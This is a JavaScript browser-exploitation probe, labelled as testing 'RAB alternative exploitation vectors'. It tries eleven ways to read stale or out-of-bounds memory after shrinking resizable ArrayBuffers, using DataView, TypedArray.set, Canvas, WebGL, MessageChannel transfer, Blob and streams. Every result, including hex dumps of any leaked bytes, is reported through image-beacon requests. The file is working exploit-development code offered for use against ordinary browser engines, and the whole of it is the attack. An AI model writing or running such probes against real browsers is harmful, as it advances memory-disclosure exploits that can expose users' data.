// p160d — RAB alternative exploitation vectors
// All DOM API sinks blocked. Try: DataView, Canvas, SAB, transfer, TypedArray.set
// Beacon prefix: V160D-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V160D-' + tag + '&t=' + Date.now(); } catch(e) {}
  }
  function hex(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var INIT = 8192;
  var MAX = 65536;

  // T1: SharedArrayBuffer availability
  try {
    var sab = new SharedArrayBuffer(16);
    B('T1-SAB-YES');
    try {
      var gsab = new SharedArrayBuffer(16, { maxByteLength: 64 });
      B('T1-GSAB-YES-' + gsab.growable);
    } catch(e) { B('T1-GSAB-NO-' + e.message.substring(0,25)); }
  } catch(e) { B('T1-SAB-NO-' + e.message.substring(0,25)); }

  // T2: Auto-length DataView — read at offsets beyond resized size
  try {
    var rab2 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var fill2 = new Uint8Array(rab2);
    for (var i = 0; i < INIT; i++) fill2[i] = 0xBB;
    fill2[100] = 0xDE; fill2[101] = 0xAD;
    var dv2 = new DataView(rab2); // auto-length
    B('T2-DV-PRE-' + dv2.byteLength);
    rab2.resize(1);
    B('T2-DV-POST-' + dv2.byteLength);
    // Try reading beyond resized boundary
    try {
      var v = dv2.getUint8(0);
      B('T2-DV-0-' + hex(v));
    } catch(e) { B('T2-DV-0-ERR-' + e.message.substring(0,25)); }
    try {
      var v = dv2.getUint8(100);
      B('T2-DV-100-' + hex(v));
    } catch(e) { B('T2-DV-100-ERR-' + e.message.substring(0,25)); }
    try {
      var v = dv2.getUint32(100, true);
      B('T2-DV32-100-' + v.toString(16));
    } catch(e) { B('T2-DV32-ERR-' + e.message.substring(0,25)); }
  } catch(e) { B('T2-ERR-' + e.message.substring(0,25)); }

  // T3: Explicit-length DataView created BEFORE resize
  try {
    var rab3 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var fill3 = new Uint8Array(rab3);
    for (var i = 0; i < INIT; i++) fill3[i] = 0xCC;
    fill3[200] = 0xCA; fill3[201] = 0xFE;
    var dv3 = new DataView(rab3, 0, INIT); // explicit length
    B('T3-DV-PRE-' + dv3.byteLength);
    rab3.resize(1);
    B('T3-DV-POST-' + dv3.byteLength);
    try {
      var v = dv3.getUint8(200);
      B('T3-DV-200-' + hex(v));
    } catch(e) { B('T3-DV-200-ERR-' + e.message.substring(0,25)); }
  } catch(e) { B('T3-ERR-' + e.message.substring(0,25)); }

  // T4: Canvas operations with RAB view
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 32; canvas.height = 32;
    var ctx = canvas.getContext('2d');
    if (!ctx) { B('T4-NO-CTX'); }
    else {
      B('T4-CTX-OK');
      // Create ImageData from RAB-backed Uint8ClampedArray
      var rab4 = new ArrayBuffer(32*32*4, { maxByteLength: MAX });
      var clamp4 = new Uint8ClampedArray(rab4);
      for (var i = 0; i < 32*32*4; i += 4) {
        clamp4[i] = 0xDE; clamp4[i+1] = 0xAD; clamp4[i+2] = 0xBE; clamp4[i+3] = 0xFF;
      }
      try {
        var imgData = new ImageData(clamp4, 32, 32);
        B('T4-IMGDATA-OK');
        ctx.putImageData(imgData, 0, 0);
        B('T4-PUT-OK');
        // Now resize and try to read back
        rab4.resize(1);
        try {
          var readBack = ctx.getImageData(0, 0, 32, 32);
          B('T4-GET-OK-' + readBack.data.length);
          B('T4-GET-PIX-' + hex(readBack.data[0]) + hex(readBack.data[1]) + hex(readBack.data[2]));
        } catch(e) { B('T4-GET-ERR-' + e.message.substring(0,25)); }
      } catch(e) { B('T4-IMGDATA-ERR-' + e.message.substring(0,25)); }
    }
  } catch(e) { B('T4-ERR-' + e.message.substring(0,25)); }

  // T5: TypedArray.set with OOB source → target
  try {
    var rab5 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var src5 = new Uint8Array(rab5);
    for (var i = 0; i < INIT; i++) src5[i] = 0xEE;
    src5[0] = 0x41; src5[1] = 0x42;
    rab5.resize(1);

    var dst5 = new Uint8Array(256);
    try {
      dst5.set(src5);
      B('T5-SET-OK-' + dst5[0].toString(16) + dst5[1].toString(16) + dst5[2].toString(16));
      var nonZero = 0;
      for (var i = 0; i < 256; i++) if (dst5[i]) nonZero++;
      B('T5-SET-NZ-' + nonZero);
    } catch(e) { B('T5-SET-ERR-' + e.message.substring(0,25)); }
  } catch(e) { B('T5-ERR-' + e.message.substring(0,25)); }

  // T6: TypedArray.set with auto-length OOB source
  try {
    var rab6 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var fill6 = new Uint8Array(rab6);
    for (var i = 0; i < INIT; i++) fill6[i] = 0xFF;
    var autoSrc6 = new Uint8Array(rab6);
    rab6.resize(1);

    var dst6 = new Uint8Array(256);
    try {
      dst6.set(autoSrc6);
      B('T6-ASET-OK-' + dst6[0].toString(16));
      var nz6 = 0;
      for (var i = 0; i < 256; i++) if (dst6[i]) nz6++;
      B('T6-ASET-NZ-' + nz6);
    } catch(e) { B('T6-ASET-ERR-' + e.message.substring(0,25)); }
  } catch(e) { B('T6-ERR-' + e.message.substring(0,25)); }

  // T7: Transfer RAB via MessageChannel
  try {
    var rab7 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var fill7 = new Uint8Array(rab7);
    for (var i = 0; i < INIT; i++) fill7[i] = 0xAA;
    rab7.resize(1);
    B('T7-RABLEN-' + rab7.byteLength);

    var mc = new MessageChannel();
    mc.port1.onmessage = function(ev) {
      var buf = ev.data;
      B('T7-RECV-' + (buf ? (buf.byteLength || 'noBL') : 'null'));
      if (buf && buf.byteLength) {
        var rv = new Uint8Array(buf);
        B('T7-RLEN-' + rv.byteLength);
        if (rv.byteLength > 1) {
          B('T7-STALE-' + (rv.byteLength - 1));
          var hx = '';
          for (var k = 0; k < Math.min(rv.byteLength, 16); k++) hx += hex(rv[k]);
          B('T7-DATA-' + hx);
        }
      }
    };
    mc.port2.postMessage(rab7, [rab7]);
    B('T7-SENT-' + rab7.byteLength);
  } catch(e) { B('T7-ERR-' + e.message.substring(0,25)); }

  // T8: WebGL availability and RAB texture upload
  try {
    var glCanvas = document.createElement('canvas');
    glCanvas.width = 64; glCanvas.height = 64;
    var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
    if (!gl) { B('T8-NO-GL'); }
    else {
      B('T8-GL-OK');
      var rab8 = new ArrayBuffer(64*64*4, { maxByteLength: MAX });
      var pix8 = new Uint8Array(rab8);
      for (var i = 0; i < 64*64*4; i++) pix8[i] = 0xDD;

      var tex = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_2D, tex);
      try {
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 64, 64, 0, gl.RGBA, gl.UNSIGNED_BYTE, pix8);
        B('T8-TEX-OK');
        rab8.resize(1);
        // Read pixels back
        var fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
        var readPix = new Uint8Array(64*64*4);
        gl.readPixels(0, 0, 64, 64, gl.RGBA, gl.UNSIGNED_BYTE, readPix);
        B('T8-READ-' + hex(readPix[0]) + hex(readPix[1]) + hex(readPix[2]) + hex(readPix[3]));
      } catch(e) { B('T8-TEX-ERR-' + e.message.substring(0,25)); }
    }
  } catch(e) { B('T8-ERR-' + e.message.substring(0,25)); }

  // T9: Uint8Array on RAB with non-zero offset, resize below offset
  try {
    var rab9 = new ArrayBuffer(INIT, { maxByteLength: MAX });
    var fill9 = new Uint8Array(rab9);
    for (var i = 0; i < INIT; i++) fill9[i] = 0x77;
    var offView = new Uint8Array(rab9, 4096, 2048); // offset=4096
    B('T9-PRE-' + offView.byteLength);
    rab9.resize(100); // now view is OOB (offset 4096 > buffer 100)
    B('T9-POST-' + offView.byteLength);
    // Can we create a Blob from this?
    try {
      var b9 = new Blob([offView]);
      B('T9-BLOB-' + b9.size);
    } catch(e) { B('T9-BLOB-ERR-' + e.message.substring(0,20)); }
    // Direct index access
    var v9 = offView[0];
    B('T9-IDX0-' + (v9 === undefined ? 'undef' : hex(v9)));
  } catch(e) { B('T9-ERR-' + e.message.substring(0,25)); }

  // T10: Atomics (if SAB available)
  try {
    var sab10 = new SharedArrayBuffer(INIT);
    var sv10 = new Int32Array(sab10);
    Atomics.store(sv10, 0, 0x12345678);
    var loaded = Atomics.load(sv10, 0);
    B('T10-ATOM-' + loaded.toString(16));
  } catch(e) { B('T10-ATOM-ERR-' + e.message.substring(0,25)); }

  // T11: ReadableStream from RAB view
  try {
    var rab11 = new ArrayBuffer(256, { maxByteLength: MAX });
    var fill11 = new Uint8Array(rab11);
    for (var i = 0; i < 256; i++) fill11[i] = 0x99;
    var v11 = new Uint8Array(rab11);
    rab11.resize(1);

    var rs = new ReadableStream({
      start: function(ctrl) {
        ctrl.enqueue(v11);
        ctrl.close();
      }
    });
    var reader = rs.getReader();
    reader.read().then(function(result) {
      if (result.value) {
        B('T11-RS-' + result.value.byteLength);
      } else {
        B('T11-RS-NULL');
      }
    }).catch(function(e) { B('T11-RS-ERR-' + e.message.substring(0,25)); });
  } catch(e) { B('T11-ERR-' + e.message.substring(0,25)); }

  setTimeout(function() { B('DONE'); }, 3000);
})();
